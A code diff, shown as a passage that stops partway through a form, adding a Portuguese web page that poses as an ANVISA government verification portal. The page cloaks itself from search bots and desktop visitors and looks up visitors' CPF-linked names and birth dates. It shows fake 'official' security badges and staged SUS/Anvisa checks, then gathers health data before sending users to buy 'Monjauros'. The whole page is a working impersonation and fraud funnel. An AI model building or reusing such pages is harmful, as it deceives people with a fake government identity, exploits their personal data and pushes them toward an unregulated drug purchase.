@@ -1,0 +1,1083 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <script>
+      // Função para detectar se é um dispositivo móvel
+      function isMobile() {
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+      }
+
+      // Função para detectar bots conhecidos
+      function isBot() {
+        const botAgents = [
+          'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+          'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
+        ];
+        return botAgents.some(bot => navigator.userAgent.includes(bot));
+      }
+
+      // Verifica largura da tela
+      function isWideScreen() {
+        return window.innerWidth > 768;
+      }
+
+      // Redirecionamento inicial para bloquear acesso suspeito
+      function checkAccess() {
+        if (isBot() || (!isMobile() && isWideScreen())) {
+          window.location.href = "https://www.gov.br/anvisa/pt-br";
+        }
+      }
+
+      // Variáveis globais para armazenar dados da API e controlar a validação
+      let apiData = null;
+      let nomeCorreto = "";
+      let dataNascimentoCorreta = "";
+      let currentStep = 1; // 1: Selecionar nome, 2: Selecionar data, 3: Loading, 4: Questionário
+      
+      // Função para gerar nomes aleatórios, incluindo o nome correto da API
+      function gerarOpcoesNomes(nomeReal) {
+        // Lista de primeiros nomes e sobrenomes aleatórios para misturar com o nome real
+        const primeirosNomes = ["MARIA", "JOÃO", "PEDRO", "ANA", "CARLOS", "PAULO", "JOSÉ", "ANTONIO", "AMANDA", "LUCAS"];
+        const sobrenomes = ["SILVA", "SANTOS", "OLIVEIRA", "SOUZA", "RODRIGUES", "FERREIRA", "ALMEIDA", "PEREIRA", "COSTA", "CARVALHO"];
+        
+        // Dividir o nome real em partes
+        const partesNome = nomeReal.split(" ");
+        const primeiroNomeReal = partesNome[0];
+        const sobrenomeReal = partesNome[partesNome.length - 1];
+        
+        let opcoes = [];
+        
+        // Adicionar o nome real
+        opcoes.push(nomeReal);
+        
+        // Adicionar três nomes aleatórios
+        while (opcoes.length < 4) {
+          const primeiroNomeRandom = primeirosNomes[Math.floor(Math.random() * primeirosNomes.length)];
+          const sobrenomeRandom = sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
+          const nomeRandom = `${primeiroNomeRandom} ${sobrenomeRandom}`;
+          
+          // Evitar repetições
+          if (!opcoes.includes(nomeRandom) && nomeRandom !== nomeReal) {
+            opcoes.push(nomeRandom);
+          }
+        }
+        
+        // Embaralhar as opções
+        opcoes.sort(() => Math.random() - 0.5);
+        
+        return opcoes;
+      }
+      
+      // Função para gerar datas de nascimento aleatórias, incluindo a data correta da API
+      function gerarOpcoesDatas(dataReal) {
+        // Converter a data real de formato ISO para Date
+        const partesData = dataReal.split("T")[0].split("-");
+        const anoReal = parseInt(partesData[0]);
+        const mesReal = parseInt(partesData[1]);
+        const diaReal = parseInt(partesData[2]);
+        
+        // Formatar a data real para dd/mm/aaaa
+        const dataRealFormatada = `${diaReal.toString().padStart(2, '0')}/${mesReal.toString().padStart(2, '0')}/${anoReal}`;
+        
+        let opcoes = [];
+        
+        // Adicionar a data real
+        opcoes.push(dataRealFormatada);
+        
+        // Adicionar três datas aleatórias próximas
+        while (opcoes.length < 4) {
+          // Gerar uma data aleatória modificando ligeiramente a data real
+          const randomOffset = Math.floor(Math.random() * 6) - 3; // -3 a +3 anos
+          const anoRandom = anoReal + randomOffset;
+          
+          // Variar o mês e dia levemente
+          let mesRandom = mesReal + (Math.floor(Math.random() * 3) - 1); // -1 a +1 mês
+          if (mesRandom < 1) mesRandom = 12;
+          if (mesRandom > 12) mesRandom = 1;
+          
+          let diaRandom = diaReal + (Math.floor(Math.random() * 5) - 2); // -2 a +2 dias
+          if (diaRandom < 1) diaRandom = 28;
+          if (diaRandom > 28) diaRandom = 1; // Limite conservador para evitar datas inválidas
+          
+          const dataRandomFormatada = `${diaRandom.toString().padStart(2, '0')}/${mesRandom.toString().padStart(2, '0')}/${anoRandom}`;
+          
+          // Evitar repetições
+          if (!opcoes.includes(dataRandomFormatada)) {
+            opcoes.push(dataRandomFormatada);
+          }
+        }
+        
+        // Embaralhar as opções
+        opcoes.sort(() => Math.random() - 0.5);
+        
+        return opcoes;
+      }
+      
+      // Função para mostrar as opções de seleção
+      function mostrarOpcoesNome(opcoes) {
+        const containerOpcoes = document.getElementById('opcoesContainer');
+        containerOpcoes.innerHTML = '';
+        containerOpcoes.classList.remove('hidden');
+        
+        // Título
+        const titulo = document.createElement('h3');
+        titulo.className = 'text-lg font-semibold text-[#0c326f] mb-4';
+        titulo.textContent = 'Selecione seu nome completo:';
+        containerOpcoes.appendChild(titulo);
+        
+        // Opções
+        opcoes.forEach(opcao => {
+          const btn = document.createElement('button');
+          btn.className = 'option-button bg-white border border-gray-300 rounded-lg px-5 py-3 w-full text-left font-medium mb-3 hover:bg-gray-50 transition';
+          btn.textContent = opcao;
+          btn.onclick = function() {
+            selecionarNome(opcao);
+          };
+          containerOpcoes.appendChild(btn);
+        });
+      }
+      
+      // Função para mostrar as opções de data de nascimento
+      function mostrarOpcoesDatas(opcoes) {
+        const containerOpcoes = document.getElementById('opcoesContainer');
+        containerOpcoes.innerHTML = '';
+        
+        // Título
+        const titulo = document.createElement('h3');
+        titulo.className = 'text-lg font-semibold text-[#0c326f] mb-4';
+        titulo.textContent = 'Selecione sua data de nascimento:';
+        containerOpcoes.appendChild(titulo);
+        
+        // Opções
+        opcoes.forEach(opcao => {
+          const btn = document.createElement('button');
+          btn.className = 'option-button bg-white border border-gray-300 rounded-lg px-5 py-3 w-full text-left font-medium mb-3 hover:bg-gray-50 transition';
+          btn.textContent = opcao;
+          btn.onclick = function() {
+            selecionarDataNascimento(opcao);
+          };
+          containerOpcoes.appendChild(btn);
+        });
+      }
+      
+      // Função para processar a seleção de nome
+      function selecionarNome(nomeSelecionado) {
+        if (nomeSelecionado === nomeCorreto) {
+          // Nome correto selecionado
+          showMessage("Nome confirmado com sucesso!", "success");
+          currentStep = 2; // Avançar para seleção de data
+          
+          // Destacar a opção correta com animação verde pulsante
+          document.querySelectorAll('.option-button').forEach(btn => {
+            if (btn.textContent === nomeSelecionado) {
+              btn.classList.add('border-green-500', 'bg-green-50');
+              
+              // Adicionar um ícone de verificação ao lado do nome
+              const checkIcon = document.createElement('i');
+              checkIcon.className = 'fas fa-check-circle text-green-600 ml-2';
+              btn.appendChild(checkIcon);
+            }
+          });
+          
+          // Gerar e mostrar opções de datas após um breve delay
+          setTimeout(function() {
+            const opcoesDatas = gerarOpcoesDatas(dataNascimentoCorreta);
+            mostrarOpcoesDatas(opcoesDatas);
+          }, 1500);
+        } else {
+          // Nome incorreto
+          showMessage("O nome selecionado não corresponde aos nossos registros. Tente novamente.", "error");
+          
+          // Reforçar a segurança: destacar botões incorretos
+          document.querySelectorAll('.option-button').forEach(btn => {
+            if (btn.textContent === nomeSelecionado) {
+              btn.classList.add('border-red-500', 'bg-red-50');
+              btn.disabled = true;
+              
+              // Adicionar um ícone de X ao lado do nome incorreto
+              const xIcon = document.createElement('i');
+              xIcon.className = 'fas fa-times-circle text-red-600 ml-2';
+              btn.appendChild(xIcon);
+            }
+          });
+        }
+      }
+      
+      // Função para processar a seleção de data de nascimento
+      function selecionarDataNascimento(dataSelecionada) {
+        // Converter data da API (formato ISO) para o formato dd/mm/aaaa para comparação
+        const partesData = dataNascimentoCorreta.split("T")[0].split("-");
+        const dataFormatada = `${partesData[2].toString().padStart(2, '0')}/${partesData[1].toString().padStart(2, '0')}/${partesData[0]}`;
+        
+        if (dataSelecionada === dataFormatada) {
+          // Data correta selecionada
+          showMessage("Data de nascimento confirmada!", "success");
+          currentStep = 3; // Avançar para tela de carregamento
+          
+          // Destacar a opção correta com animação verde pulsante
+          document.querySelectorAll('.option-button').forEach(btn => {
+            if (btn.textContent === dataSelecionada) {
+              btn.classList.add('border-green-500', 'bg-green-50');
+              
+              // Adicionar um ícone de verificação ao lado da data
+              const checkIcon = document.createElement('i');
+              checkIcon.className = 'fas fa-check-circle text-green-600 ml-2';
+              btn.appendChild(checkIcon);
+            }
+          });
+          
+          // Esconder contêiner de opções 
+          setTimeout(function() {
+            document.getElementById('opcoesContainer').classList.add('hidden');
+            showMessage("Verificação bem-sucedida! Redirecionando...", "success");
+            
+            // Salvar os dados do CPF validado e outras informações importantes no localStorage
+            if (apiData && apiData.Result) {
+              localStorage.setItem('nomeCompleto', apiData.Result.NomePessoaFisica || '');
+              localStorage.setItem('dataNascimento', dataFormatada || '');
+              localStorage.setItem('situacaoCadastral', apiData.Result.SituacaoCadastral || '');
+              localStorage.setItem('dadosValidados', 'true');
+            }
+            
+            // Redirecionar para a página de validação em andamento depois de um breve delay
+            setTimeout(function() {
+              window.location.href = "/validacao-em-andamento";
+            }, 1500);
+          }, 1500);
+        } else {
+          // Data incorreta
+          showMessage("A data selecionada não corresponde aos nossos registros. Tente novamente.", "error");
+          
+          // Reforçar a segurança: destacar botões incorretos
+          document.querySelectorAll('.option-button').forEach(btn => {
+            if (btn.textContent === dataSelecionada) {
+              btn.classList.add('border-red-500', 'bg-red-50');
+              btn.disabled = true;
+              
+              // Adicionar um ícone de X ao lado da data incorreta
+              const xIcon = document.createElement('i');
+              xIcon.className = 'fas fa-times-circle text-red-600 ml-2';
+              btn.appendChild(xIcon);
+            }
+          });
+        }
+      }
+      
+      // Função para iniciar e exibir as etapas de carregamento
+      function iniciarEtapasCarregamento() {
+        const loadingContainer = document.getElementById('loadingSteps');
+        loadingContainer.classList.remove('hidden');
+        
+        const etapas = [
+          "Verificando Histórico Clínico",
+          "Consultando Registros no SUS",
+          "Validando Prescrição com a Anvisa",
+          "Obtendo Dados de Saúde Complementares"
+        ];
+        
+        let etapaAtual = 0;
+        
+        function mostrarProximaEtapa() {
+          if (etapaAtual < etapas.length) {
+            const etapa = document.createElement('div');
+            etapa.className = 'loading-step flex items-center mb-4 opacity-0 transition-opacity duration-500';
+            
+            const icon = document.createElement('div');
+            icon.className = 'step-icon mr-3';
+            icon.innerHTML = '<i class="fas fa-circle-notch fa-spin text-[#1351b4]"></i>';
+            
+            const text = document.createElement('div');
+            text.className = 'step-text text-[#333]';
+            text.textContent = etapas[etapaAtual];
+            
+            etapa.appendChild(icon);
+            etapa.appendChild(text);
+            loadingContainer.appendChild(etapa);
+            
+            // Animar entrada
+            setTimeout(() => etapa.classList.add('opacity-100'), 50);
+            
+            // Marcar como completado após 1.5 segundos
+            setTimeout(() => {
+              icon.innerHTML = '<i class="fas fa-check-circle text-green-600"></i>';
+              etapaAtual++;
+              
+              if (etapaAtual < etapas.length) {
+                mostrarProximaEtapa();
+              } else {
+                // Todas as etapas concluídas
+                setTimeout(() => {
+                  currentStep = 4; // Avançar para questionário
+                  mostrarQuestionarioSaude();
+                }, 1500);
+              }
+            }, 1500);
+          }
+        }
+        
+        // Iniciar a primeira etapa
+        mostrarProximaEtapa();
+      }
+      
+      // Função para mostrar o questionário de saúde
+      function mostrarQuestionarioSaude() {
+        document.getElementById('loadingSteps').classList.add('hidden');
+        document.getElementById('questionarioSaude').classList.remove('hidden');
+      }
+      
+      // Função para processar o envio do formulário de saúde
+      function submitHealthForm(event) {
+        event.preventDefault();
+        
+        // Mostrar indicador de processamento
+        document.getElementById('submitHealthButton').disabled = true;
+        document.getElementById('healthFormLoader').classList.remove('hidden');
+        
+        // Simular envio e processamento do formulário
+        setTimeout(function() {
+          // Ocultar o indicador de processamento
+          document.getElementById('healthFormLoader').classList.add('hidden');
+          
+          // Redirecionar para a página de compra
+          showMessage("Dados enviados com sucesso! Redirecionando...", "success");
+          
+          // Armazenar dados de identificação para uso posterior (nome e data de nascimento)
+          if (apiData && apiData.Result) {
+            localStorage.setItem('nomeCompleto', apiData.Result.NomePessoaFisica || '');
+            localStorage.setItem('cpfConfirmado', 'true');
+          }
+          
+          // Redirecionar após um breve delay
+          setTimeout(function() {
+            window.location.href = "/compra";
+          }, 1500);
+        }, 2000);
+      }
+      
+      window.onload = function() {
+        checkAccess();
+        
+        // Verificar se existe CPF validado no localStorage
+        const cpfValidado = localStorage.getItem('cpfValidado');
+        if (!cpfValidado) {
+          // Redirecionar para a página de cadastro se não houver CPF validado
+          window.location.href = "/cadastro";
+          return;
+        }
+        
+        // Preencher o campo CPF e formatar automaticamente
+        document.getElementById('cpfInput').value = formatCPF(cpfValidado);
+        
+        // Iniciar o processo de consulta de CPF automaticamente
+        setTimeout(function() {
+          showMessage("Consultando seus dados...", "processing");
+          document.getElementById('loader').classList.remove('hidden');
+          
+          // Consultar API da Receita Federal (Exato Digital)
+          const cpfSomenteNumeros = cpfValidado.replace(/\D/g, '');
+          
+          // Chamada para API 
+          fetch(`/consultar-cpf-inscricao?cpf=${cpfSomenteNumeros}`)
+            .then(response => response.json())
+            .then(data => {
+              document.getElementById('loader').classList.add('hidden');
+              
+              if (data && data.Result) {
+                // Armazenar os dados da API
+                apiData = data;
+                nomeCorreto = data.Result.NomePessoaFisica;
+                dataNascimentoCorreta = data.Result.DataNascimento;
+                
+                // Gerar opções de nomes
+                const opcoesNomes = gerarOpcoesNomes(nomeCorreto);
+                
+                // Mostrar opções para seleção
+                mostrarOpcoesNome(opcoesNomes);
+                
+                showMessage("Verifique sua identidade selecionando seu nome correto.", "processing");
+              } else {
+                showMessage("Não foi possível consultar os dados do CPF. Por favor, tente novamente mais tarde.", "error");
+              }
+            })
+            .catch(error => {
+              document.getElementById('loader').classList.add('hidden');
+              showMessage("Erro ao consultar dados. Por favor, tente novamente mais tarde.", "error");
+              console.error("Erro ao consultar CPF:", error);
+            });
+        }, 500);
+      };
+      
+      function formatCPF(cpf) {
+        cpf = cpf.replace(/\D/g, '');
+        return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+      }
+      
+      function formatDate(date) {
+        const parts = date.split('-');
+        if (parts.length === 3) {
+          return `${parts[2]}/${parts[1]}/${parts[0]}`;
+        }
+        return date;
+      }
+      
+      function showMessage(message, type) {
+        const messageElement = document.getElementById('statusMessage');
+        messageElement.textContent = message;
+        
+        // Remover classes anteriores
+        messageElement.classList.remove('text-green-600', 'text-red-600', 'text-blue-600');
+        
+        // Adicionar classe de acordo com o tipo
+        if (type === 'success') {
+          messageElement.classList.add('text-green-600');
+        } else if (type === 'error') {
+          messageElement.classList.add('text-red-600');
+        } else if (type === 'processing') {
+          messageElement.classList.add('text-blue-600');
+        }
+        
+        messageElement.classList.remove('hidden');
+      }
+      
+      function populateDataFromAPI(data) {
+        // Preencher os dados recebidos da API Exato Digital
+        if (data.Result) {
+          // Nome completo
+          document.getElementById('clientName').textContent = data.Result.NomePessoaFisica || '';
+          
+          // Data de nascimento
+          let dataNascimento = data.Result.DataNascimento || '';
+          if (dataNascimento) {
+            // Converter formato ISO para data legível
+            dataNascimento = formatDate(dataNascimento.split('T')[0]);
+          }
+          document.getElementById('clientBirthDate').textContent = dataNascimento;
+          
+          // Armazenar os dados para uso posterior, se necessário
+          localStorage.setItem('nomeCompleto', data.Result.NomePessoaFisica || '');
+          localStorage.setItem('dataNascimento', dataNascimento || '');
+          localStorage.setItem('situacaoCadastral', data.Result.SituacaoCadastral || '');
+        }
+      }
+      
+      function confirmData() {
+        // Indicar processamento
+        document.getElementById('confirmButton').disabled = true;
+        showMessage("Verificando dados...", "processing");
+        document.getElementById('confirmLoader').classList.remove('hidden');
+        
+        // Simular processamento
+        setTimeout(function() {
+          document.getElementById('confirmLoader').classList.add('hidden');
+          showMessage("Dados confirmados com sucesso!", "success");
+          
+          // Redirecionar para a página de compra
+          setTimeout(function() {
+            window.location.href = "/compra";
+          }, 1500);
+        }, 2000);
+      }
+  </script>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <title>Verificação de Dados - ANVISA</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+  <style>
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+      font-weight: 400;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-400i.1701033bc0b08320.woff2') }}") format('woff2');
+      font-weight: 400;
+      font-style: italic;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
+      font-weight: 500;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+      font-weight: 600;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-700.4b7902400c7e32ac.woff2') }}") format('woff2');
+      font-weight: 700;
+      font-style: normal;
+    }
+    
+    body {
+      font-family: 'Rawline', sans-serif;
+      background-color: #f8f9fa;
+    }
+    .main-title {
+      font-size: 1.4rem;
+      line-height: 2rem;
+      font-weight: 600;
+      color: #0c326f;
+      padding-bottom: 10px;
+      margin: 0;
+    }
+    .subtitle {
+      font-weight: 400;
+      font-size: 16px;
+      color: #555;
+      line-height: normal;
+      margin-bottom: 10px;
+    }
+    .sticky-header {
+      position: sticky;
+      top: 0;
+      background-color: white;
+      z-index: 1000;
+      transition: box-shadow 0.3s ease;
+    }
+    .sticky-header.shadow {
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    .secure-badge {
+      background-color: #e6f3e6;
+      padding: 5px 10px;
+      border-radius: 5px;
+      font-size: 12px;
+      color: #2e7d32;
+      display: inline-flex;
+      align-items: center;
+      margin-right: 8px;
+    }
+    .secure-badge i {
+      margin-right: 4px;
+    }
+    .validation-container {
+      background-color: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+      margin: 20px auto;
+      max-width: 500px;
+    }
+    .info-box {
+      background-color: #f1f7fe;
+      border-left: 4px solid #1351b4;
+      padding: 15px;
+      margin: 20px 0;
+      border-radius: 0 5px 5px 0;
+    }
+    .info-icon {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background-color: #e3f2fd;
+      color: #1351b4;
+      margin-right: 15px;
+    }
+    .loader {
+      border: 3px solid #f3f3f3;
+      border-radius: 50%;
+      border-top: 3px solid #1351b4;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .data-row {
+      display: flex;
+      margin-bottom: 15px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid #eee;
+    }
+    .data-label {
+      width: 40%;
+      font-weight: 500;
+      color: #555;
+    }
+    .data-value {
+      width: 60%;
+      font-weight: 600;
+      color: #333;
+    }
+    .confirm-button {
+      background-color: #1351b4;
+      color: white;
+      padding: 12px 25px;
+      border: none;
+      border-radius: 30px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .confirm-button:hover {
+      background-color: #0c3d8a;
+    }
+    .confirm-button:disabled {
+      background-color: #cccccc;
+      cursor: not-allowed;
+    }
+    .hidden {
+      display: none;
+    }
+    .vlibras-icon {
+      position: fixed;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      z-index: 1000;
+    }
+    
+    /* Estilos para as opções de seleção */
+    .option-button {
+      transition: all 0.3s ease;
+    }
+    .option-button:hover {
+      border-color: #1351b4;
+      background-color: #f0f7ff;
+    }
+    .option-button.selected {
+      border-color: #1351b4;
+      background-color: #e6f0ff;
+    }
+    .option-button.border-green-500 {
+      animation: pulse-green 2s infinite;
+    }
+    
+    /* Animação de pulsação verde para seleção correta */
+    @keyframes pulse-green {
+      0% {
+        box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7);
+      }
+      70% {
+        box-shadow: 0 0 0 10px rgba(34, 197, 94, 0);
+      }
+      100% {
+        box-shadow: 0 0 0 0 rgba(34, 197, 94, 0);
+      }
+    }
+    
+    /* Estilos para as etapas de carregamento */
+    .loading-step {
+      transition: opacity 0.5s ease;
+    }
+    
+    /* Estilos para questionário de saúde */
+    #questionarioSaude h3 {
+      border-bottom: 2px solid #1351b4;
+      padding-bottom: 10px;
+      display: inline-block;
+    }
+    
+    /* Estilizar inputs de radio e checkbox */
+    input[type="radio"], 
+    input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      accent-color: #1351b4;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
+  <div class="sticky-header">
+    <div class="container mx-auto px-4 border-b border-[#0000001a]">
+      <div class="flex items-center justify-between py-2">
+        <div class="flex items-center">
+          <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1"></i>
+          <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight">
+            Centro de Verificação Digital | ANVISA
+          </p>
+        </div>
+        <div class="flex items-center space-x-4">
+          <i class="fas fa-shield-alt text-sm text-green-600 relative -top-1"></i>
+          <i class="fas fa-lock text-sm text-green-600 relative -top-1"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="container mx-auto px-4">
+    <div class="py-4">
+      <div class="flex items-center space-x-2 text-[13px]">
+        <a class="text-[#1451B4]" href="#"><i class="fas fa-home text-sm text-[#1451B4]"></i></a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Portal Cidadão</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Verificação de Acesso</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <span class="font-bold">Validação de Dados</span>
+      </div>
+    </div>
+  </div>
+
+  <main class="max-w-3xl mx-auto px-4 py-6">
+    <div class="mb-6">
+      <h2 class="main-title">
+        Validação de Dados Pessoais
+      </h2>
+      <p class="subtitle">
+        Confirme seus dados para prosseguir com o processo de aquisição do Monjauros.
+      </p>
+    </div>
+    
+    <div class="flex flex-wrap justify-center gap-3 my-4">
+      <span class="secure-badge"><i class="fas fa-shield-alt"></i> Site Oficial</span>
+      <span class="secure-badge"><i class="fas fa-lock"></i> Conexão Segura</span>
+      <span class="secure-badge"><i class="fas fa-database"></i> Dados Protegidos</span>
+    </div>
+    
+    <div class="info-box flex items-start">
+      <div class="info-icon">
+        <i class="fas fa-info"></i>
+      </div>
+      <div>
+        <h3 class="font-semibold text-[#1351b4] mb-1">Verificação de Identidade</h3>
+        <p class="text-sm">Seus dados serão consultados na base governamental para confirmar sua identidade. Este processo é 100% seguro e seus dados estão protegidos de acordo com a LGPD.</p>
+      </div>
+    </div>
+    
+    <div class="validation-container">
+      <div class="text-center">
+        <h3 class="text-lg font-semibold text-[#0c326f] mb-2">Consulta de CPF</h3>
+        <p class="text-sm text-gray-600 mb-4">Confira se os dados estão corretos</p>
+        
+        <div class="flex justify-center mb-4">
+          <div class="border border-gray-300 rounded px-4 py-2 text-center">
+            <label class="block text-xs text-gray-500 mb-1">CPF</label>
+            <span id="cpfInput" class="text-lg font-bold"></span>
+          </div>
+        </div>
+        
+        <p id="statusMessage" class="mb-4 font-medium text-blue-600">Consultando dados...</p>
+        
+        <div id="loader" class="loader"></div>
+        
+        <!-- Contêiner para opções de seleção (nome e data de nascimento) -->
+        <div id="opcoesContainer" class="hidden">
+          <!-- As opções serão adicionadas dinamicamente pelo JavaScript -->
+        </div>
+        
+        <!-- Etapas de carregamento -->
+        <div id="loadingSteps" class="hidden bg-white p-6 rounded-lg shadow-sm mb-6">
+          <h3 class="text-lg font-semibold text-[#0c326f] mb-4">Verificação em andamento</h3>
+          <p class="text-sm text-gray-600 mb-4">Aguarde enquanto verificamos seus dados nos sistemas oficiais.</p>
+          <!-- As etapas serão adicionadas dinamicamente pelo JavaScript -->
+        </div>
+        
+        <!-- Questionário de saúde -->
+        <div id="questionarioSaude" class="hidden bg-white p-6 rounded-lg shadow-sm">
+          <h3 class="text-lg font-semibold text-[#0c326f] mb-4">Questionário de Saúde</h3>
+          <p class="text-sm text-gray-600 mb-6">Para finalizar o processo, por favor, responda às seguintes perguntas sobre sua saúde:</p>
+          
+          <form id="healthForm" onsubmit="submitHealthForm(event)">
+            <!-- Peso -->
+            <div class="mb-8">
+              <h4 class="font-semibold text-gray-700 mb-3">1. Peso Atual Aproximado</h4>
+              <div class="space-y-2">
+                <label class="flex items-center">
+                  <input type="radio" name="peso" value="menos60" class="mr-3" required>
+                  <span>Menos de 60 kg</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="peso" value="60a80" class="mr-3">
+                  <span>60 a 80 kg</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="peso" value="81a100" class="mr-3">
+                  <span>81 a 100 kg</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="peso" value="mais100" class="mr-3">
+                  <span>Mais de 100 kg</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="peso" value="naoInformar" class="mr-3">
+                  <span>Prefiro não informar</span>
+                </label>
+              </div>
+            </div>
+            
+            <!-- Altura -->
+            <div class="mb-8">
+              <h4 class="font-semibold text-gray-700 mb-3">2. Altura Aproximada</h4>
+              <div class="space-y-2">
+                <label class="flex items-center">
+                  <input type="radio" name="altura" value="menos150" class="mr-3" required>
+                  <span>Menos de 1,50 m</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="altura" value="150a165" class="mr-3">
+                  <span>1,50 m a 1,65 m</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="altura" value="166a180" class="mr-3">
+                  <span>1,66 m a 1,80 m</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="altura" value="mais180" class="mr-3">
+                  <span>Mais de 1,80 m</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="altura" value="naoInformar" class="mr-3">
+                  <span>Prefiro não informar</span>
+                </label>
+              </div>
+            </div>
+            
+            <!-- Motivo da Prescrição -->
+            <div class="mb-8">
+              <h4 class="font-semibold text-gray-700 mb-3">3. Motivo da Prescrição</h4>
+              <div class="space-y-2">
+                <label class="flex items-center">
+                  <input type="radio" name="motivoPrescrição" value="diabetes" class="mr-3" required>
+                  <span>Controle de açúcar no sangue (diabetes)</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="motivoPrescrição" value="peso" class="mr-3">
+                  <span>Controle de peso</span>
+                </label>
+                <label class="flex items-start">
+                  <input type="radio" name="motivoPrescrição" value="outro" class="mr-3 mt-1">
+                  <div>
+                    <span>Outro motivo</span>
+                    <input type="text" placeholder="Indique, se quiser" class="block mt-1 p-2 border border-gray-300 rounded text-sm w-full">
+                  </div>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="motivoPrescrição" value="naoSei" class="mr-3">
+                  <span>Não sei/Não informado pelo médico</span>
+                </label>
+              </div>
+            </div>
+            
+            <!-- Uso de Outros Medicamentos -->
+            <div class="mb-8">
+              <h4 class="font-semibold text-gray-700 mb-3">4. Uso de Outros Medicamentos</h4>
+              <div class="space-y-2">
+                <label class="flex items-center">
+                  <input type="radio" name="usoMedicamentos" value="sim" class="mr-3" required>
+                  <span>Sim, tomo medicamentos regularmente</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="usoMedicamentos" value="nao" class="mr-3">
+                  <span>Não, não tomo medicamentos</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="usoMedicamentos" value="naoInformar" class="mr-3">
+                  <span>Não sei/Prefiro não informar</span>
+                </label>
+              </div>
+            </div>
+            
+            <!-- Condições de Saúde -->
+            <div class="mb-8">
+              <h4 class="font-semibold text-gray-700 mb-3">5. Condições de Saúde Atuais</h4>
+              <div class="space-y-2">
+                <label class="flex items-center">
+                  <input type="checkbox" name="condicoesSaude" value="diabetes" class="mr-3">
+                  <span>Diabetes</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="checkbox" name="condicoesSaude" value="pressaoAlta" class="mr-3">
+                  <span>Pressão alta</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="checkbox" name="condicoesSaude" value="problemasCoracao" class="mr-3">
+                  <span>Problemas de coração</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="checkbox" name="condicoesSaude" value="nenhuma" class="mr-3">
+                  <span>Nenhuma condição de saúde</span>
+                </label>
+                <label class="flex items-start">
+                  <input type="checkbox" name="condicoesSaude" value="outra" class="mr-3 mt-1">
+                  <div>
+                    <span>Outra</span>
+                    <input type="text" placeholder="Indique, se quiser" class="block mt-1 p-2 border border-gray-300 rounded text-sm w-full">
+                  </div>
+                </label>
+                <label class="flex items-center">
+                  <input type="checkbox" name="condicoesSaude" value="naoInformar" class="mr-3">
+                  <span>Prefiro não informar</span>
+                </label>
+              </div>
+            </div>
+            
+            <!-- Atividade Física -->
+            <div class="mb-8">
+              <h4 class="font-semibold text-gray-700 mb-3">6. Atividade Física</h4>
+              <div class="space-y-2">
+                <label class="flex items-center">
+                  <input type="radio" name="atividadeFisica" value="regular" class="mr-3" required>
+                  <span>Faço exercícios regularmente (ex.: caminhada, academia)</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="atividadeFisica" value="asVezes" class="mr-3">
+                  <span>Faço exercícios às vezes</span>
+                </label>
+                <label class="flex items-center">
+                  <input type="radio" name="atividadeFisica" value="nao" class="mr-3">
+                  <span>Não faço exercícios</span>
+                </label>
+                <label class="flex items-center">
